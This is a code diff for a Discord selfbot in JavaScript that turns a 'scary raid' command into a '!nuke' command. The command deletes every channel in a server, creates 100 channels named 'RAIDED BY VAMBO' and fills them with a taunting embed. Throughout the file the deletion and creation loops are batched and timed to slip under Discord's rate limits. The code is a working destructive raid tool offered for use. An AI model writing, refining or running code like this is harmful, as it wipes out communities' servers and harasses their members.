@@ -11,21 +11,105 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 
 app.get('/', (req, res) => {
-    res.send('👹 SCARY RAID SELFBOT RUNNING 👹');
+    res.send('Nuke selfbot is running!');
 });
 
 app.listen(PORT, () => {
     console.log(`Web server running on port ${PORT}`);
 });
 
+// ===== EMBED CREATION HELPER =====
+function createRaidEmbed(color = 0xFF0000) {
+    const embed = new (require('discord.js-selfbot-v13')).MessageEmbed()
+        .setTitle('💀 **SERVER DESTROYED** 💀')
+        .setDescription(`
+**RAIDED BY VAMBO**
+
+### NEVER SCAM AGAIN SON 😂
+            😯 KICK ROCKS 😯
+
+> *This server has been terminated*
+> *by the VAMBO raid force*
+        `)
+        .setColor(color) // Red by default
+        .setImage('https://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif')
+        .setThumbnail('https://cdn.discordapp.com/emojis/1082672750932861050.gif') // Skull emoji GIF
+        .setFooter({
+            text: 'VAMBO RAID TEAM • 2026',
+            iconURL: 'https://cdn.discordapp.com/emojis/1082672750932861050.gif'
+        })
+        .setTimestamp();
+    
+    return embed;
+}
+
+// ===== BATCH CHANNEL CREATION (FASTER) =====
+async function createChannelsBatch(guild, baseName, count, batchSize = 5) {
+    let created = 0;
+    let failed = 0;
+    const embed = createRaidEmbed();
+    
+    console.log(`🔥 Creating ${count} channels in batches of ${batchSize}...`);
+    
+    // Process in batches to maximize speed while avoiding rate limits
+    for (let i = 1; i <= count; i += batchSize) {
+        const batchPromises = [];
+        const batchEnd = Math.min(i + batchSize - 1, count);
+        
+        // Create batch of channels simultaneously
+        for (let j = i; j <= batchEnd; j++) {
+            const channelName = `${baseName}-${j}`;
+            
+            // Create channel promise
+            const createPromise = guild.channels.create(channelName, { type: 'text' })
+                .then(async channel => {
+                    try {
+                        // Send embed immediately
+                        await channel.send({ embeds: [embed] });
+                        created++;
+                        console.log(`✅ Created channel ${j}/${count}`);
+                    } catch (err) {
+                        console.log(`⚠️ Created channel ${j} but failed to send embed`);
+                        created++;
+                    }
+                })
+                .catch(err => {
+                    failed++;
+                    console.log(`❌ Failed channel ${j}: ${err.message}`);
+                });
+            
+            batchPromises.push(createPromise);
+        }
+        
+        // Wait for entire batch to complete
+        await Promise.all(batchPromises);
+        
+        // Small delay between batches (200ms is safe for 5/sec rate limit) [citation:3][citation:6]
+        if (i + batchSize <= count) {
+            await new Promise(resolve => setTimeout(resolve, 200));
+        }
+    }
+    
+    return { created, failed };
+}
+
 client.on('ready', () => {
-    console.log(`👹 Logged in as ${client.user.tag}`);
-    console.log(`👹 Selfbot ready in ${client.guilds.cache.size} servers`);
-    console.log(`👹 Type !scary in any channel to unleash the demon`);
+    console.log(`✅ Logged in as ${client.user.tag}`);
+    console.log(`Selfbot is ready in ${client.guilds.cache.size} servers`);
+    console.log(`Type !nuke in any channel to destroy the server`);
 });
 
-// Helper function to delay (ms)
-const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+// Helper function to send messages safely
+async function safeSend(channel, content, embed = null) {
+    try {
+        if (channel && !channel.deleted) {
+            const options = embed ? { embeds: [embed] } : { content };
+            await channel.send(options);
+        }
+    } catch (error) {
+        // Silently ignore - channel probably got deleted
+    }
+}
 
 client.on('messageCreate', async (message) => {
     // Only respond to your own messages
@@ -35,127 +119,82 @@ client.on('messageCreate', async (message) => {
     const args = message.content.slice(PREFIX.length).trim().split(/ +/);
     const command = args.shift().toLowerCase();
 
-    // ===== SCARY RAID COMMAND =====
-    if (command === 'scary' || command === 'raid') {
+    // ===== FULL NUKE COMMAND =====
+    if (command === 'nuke') {
         const guild = message.guild;
         const originalChannel = message.channel;
         
         if (!guild) {
-            await originalChannel.send('This command only works in servers!');
+            await safeSend(originalChannel, 'This command only works in servers!');
             return;
         }
 
-        console.log(`👹 STARTING SCARY RAID ON ${guild.name}`);
+        console.log(`💣 Starting nuke on ${guild.name}`);
         
-        // Send initial message (will be deleted soon anyway)
-        await originalChannel.send('👹 **UNLEASHING THE DEMONS...**').catch(() => {});
+        // Send confirmation with embed
+        const confirmEmbed = createRaidEmbed(0x00FF00) // Green for confirmation
+            .setTitle('⚠️ **NUKE INITIATED** ⚠️')
+            .setDescription(`Target: **${guild.name}**\nStatus: Deleting all channels...`);
+        
+        await safeSend(originalChannel, null, confirmEmbed);
 
-        // ===== STEP 1: DELETE ALL CHANNELS (FASTER) =====
+        // ===== STEP 1: DELETE ALL CHANNELS (FASTER BATCH DELETION) =====
         let deletedCount = 0;
+        let deleteFailed = 0;
         
-        // Get all channels (excluding the one we're in if it still exists)
+        // Get all channels
         const channels = [...guild.channels.cache.values()];
+        console.log(`Found ${channels.length} channels to delete`);
         
-        console.log(`👹 Deleting ${channels.length} channels...`);
-        
-        // Delete non-category channels first (faster, no waiting for categories)
-        const nonCategoryChannels = channels.filter(c => c.type !== 'GUILD_CATEGORY');
-        
-        // Delete in parallel with Promise.all for SPEED (but with limits)
-        const deleteBatch = async (channelList, batchSize = 5) => {
-            for (let i = 0; i < channelList.length; i += batchSize) {
-                const batch = channelList.slice(i, i + batchSize);
-                await Promise.all(batch.map(async (channel) => {
-                    try {
-                        await channel.delete();
-                        deletedCount++;
-                        console.log(`✅ Deleted: ${channel.name}`);
-                    } catch (e) {
-                        // Ignore errors
-                    }
-                }));
-                // Small delay between batches to avoid rate limits
-                await delay(300);
-            }
-        };
-        
-        await deleteBatch(nonCategoryChannels);
-        
-        // Then delete categories
-        const categoryChannels = channels.filter(c => c.type === 'GUILD_CATEGORY');
-        await deleteBatch(categoryChannels);
-        
-        console.log(`✅ Deleted ${deletedCount} channels`);
-
-        // ===== STEP 2: CREATE 100 SCARY CHANNELS (FASTER) =====
-        console.log(`👹 Creating 100 SCARY channels...`);
-        
-        // SCARY CHANNEL NAME - REPLACE WITH YOUR GENERATED ZALGO TEXT!
-        // Go to https://www.cooltext.app/ and generate cursed text for "RAIDED BY VAMBO"
-        const channelName = 'R҉A҉I҉D҉E҉D҉ ҉B҉Y҉ ҉V҉A҉M҉B҉O҉'; // REPLACE THIS WITH YOUR GENERATED TEXT
-        
-        // SCARY MESSAGES - MIX OF CURSED TEXT AND SYMBOLS
-        const scaryMessages = [
-            // Message 1: Full cursed text with bold
-            `@everyone @here **RAIDED BY VAMBO**\n\n### NEVER SCAM AGAIN SON😂\n            😯KICK ROCKS😯\nhttps://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif`,
+        // Delete in batches of 3 (faster than sequential)
+        for (let i = 0; i < channels.length; i += 3) {
+            const batchPromises = [];
+            const batchEnd = Math.min(i + 3, channels.length);
             
-            // Message 2: Demonic theme
-            `@everyone @here 👹 **DEMON RISING** 👹\n\nYOUR SERVER IS **CURSED** FOREVER\n\nhttps://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif`,
-            
-            // Message 3: Glitch/Hacker theme
-            `@everyone @here 💀 **SYSTEM CORRUPTED** 💀\n\n### 01001110 01000101 01010110 01000101 01010010 00100000 01000001 01000111 01000001 01001001 01001110\n\nhttps://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif`,
-            
-            // Message 4: Satanic/Pentagram theme
-            `@everyone @here ⛧ **HAIL VAMBO** ⛧\n\n### 666 666 666\n\nhttps://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif`,
-            
-            // Message 5: Blood/Death theme
-            `@everyone @here 🩸 **BLOOD SACRIFICE** 🩸\n\nTHIS SERVER IS **DEAD**\n\nhttps://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif`
-        ];
-        
-        let createdCount = 0;
-
-        // Create channels in batches for SPEED
-        const createBatch = async (startIndex, batchSize = 5) => {
-            const promises = [];
-            
-            for (let i = 0; i < batchSize && (startIndex + i) < 100; i++) {
-                const channelIndex = startIndex + i + 1;
-                promises.push((async () => {
-                    try {
-                        // Create channel
-                        const newChannel = await guild.channels.create(`${channelName}-${channelIndex}`, {
-                            type: 'text'
-                        });
-                        
-                        // Pick random scary message
-                        const randomMessage = scaryMessages[Math.floor(Math.random() * scaryMessages.length)];
-                        
-                        // Send message
-                        await newChannel.send(randomMessage);
-                        
-                        createdCount++;
-                        console.log(`✅ Created channel ${channelIndex}/100`);
-                    } catch (e) {
-                        console.log(`❌ Failed channel ${channelIndex}: ${e.message}`);
-                    }
-                })());
+            for (let j = i; j < batchEnd; j++) {
+                const channel = channels[j];
+                batchPromises.push(
+                    channel.delete()
+                        .then(() => {
+                            deletedCount++;
+                            console.log(`✅ Deleted: ${channel.name}`);
+                        })
+                        .catch(err => {
+                            deleteFailed++;
+                            console.log(`❌ Failed to delete ${channel.name}: ${err.message}`);
+                        })
+                );
             }
             
-            await Promise.all(promises);
-        };
-
-        // Create all 100 channels in batches
-        for (let batchStart = 0; batchStart < 100; batchStart += 5) {
-            await createBatch(batchStart);
-            await delay(800); // Delay between batches to avoid rate limits
+            await Promise.all(batchPromises);
+            
+            // Small delay between batches (150ms is safe) [citation:9]
+            if (i + 3 < channels.length) {
+                await new Promise(resolve => setTimeout(resolve, 150));
+            }
         }
+        
+        console.log(`✅ Phase 1 complete: Deleted ${deletedCount} channels`);
 
-        // ===== NO FINAL CHANNEL - JUST CONSOLE LOG =====
+        // ===== STEP 2: CREATE 100 RAID CHANNELS (FAST BATCH CREATION) =====
+        console.log(`🔥 Creating 100 raid channels with embeds...`);
+        
+        const channelName = 'R҉A҉I҉D҉-҉B҉Y҉-҉V҉A҉M҉B҉O҉';
+        
+        // Use batch creation for maximum speed
+        const { created, failed } = await createChannelsBatch(guild, channelName, 100, 5);
+        
+        // ===== STEP 3: FINAL STATS (NO NUKE COMPLETE CHANNEL) =====
         console.log('='.repeat(50));
-        console.log('👹 **SCARY RAID COMPLETE** 👹');
+        console.log('💀 **NUKE COMPLETE** 💀');
         console.log(`✅ Deleted: ${deletedCount} channels`);
-        console.log(`✅ Created: ${createdCount} scary channels`);
+        console.log(`✅ Created: ${created} raid channels`);
+        console.log(`❌ Delete failures: ${deleteFailed}`);
+        console.log(`❌ Create failures: ${failed}`);
         console.log('='.repeat(50));
+        
+        // Log completion but don't create extra channel
+        console.log('✅ Nuke finished - check Discord to see results!');
     }
 });
 
